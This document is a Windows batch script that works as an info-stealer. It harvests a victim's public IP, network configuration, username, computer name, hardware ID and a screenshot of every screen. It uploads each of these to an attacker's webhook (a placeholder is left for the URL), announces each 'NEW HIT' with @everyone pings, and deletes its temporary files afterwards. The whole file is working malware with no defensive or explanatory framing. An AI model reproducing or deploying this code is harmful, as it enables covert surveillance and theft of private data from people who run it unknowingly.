@echo off
mode con: cols=25 lines=15
set "tempfile=%~dp0screenshot.png"
set webhook=*ur webhook here*
curl -X POST -d "content=||@here||||@everyone||" %webhook%
curl -X POST -d "content=NEW HIT!!!!" %webhook%

curl -X POST -d "content=public ip:" %webhook%
curl --silent --output ip.txt http://ipinfo.io/ip
curl --silent --output /dev/null -F l=@"ip.txt" %webhook%
del ip.txt

curl -X POST -d "content=ipconfig:" %webhook%
ipconfig >database.txt
curl --silent --output /dev/null -F l=@"database.txt" %webhook%
del database.txt

curl -X POST -d "content= pc username:" %webhook%
echo %username%>pcusername.txt
curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook%
del pcusername.txt 

curl -X POST -d "content= pc name:" %webhook%
hostname>pcname.txt 
curl --silent --output /dev/null -F l=@"pcname.txt" %webhook%
del pcname.txt 

curl -X POST -d "content= uuid(hwid):" %webhook%
wmic csproduct get uuid>hwid.txt 
curl --silent --output /dev/null -F l=@"hwid.txt" %webhook%
del hwid.txt 


powershell -command "& { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $bounds = $_.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save('%tempfile%', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose() }}"
curl -X POST -d "content= screenshot of victim's pc" %webhook%
curl --silent --output /dev/null -F l=@"screenshot.png" %webhook%
del screenshot.png
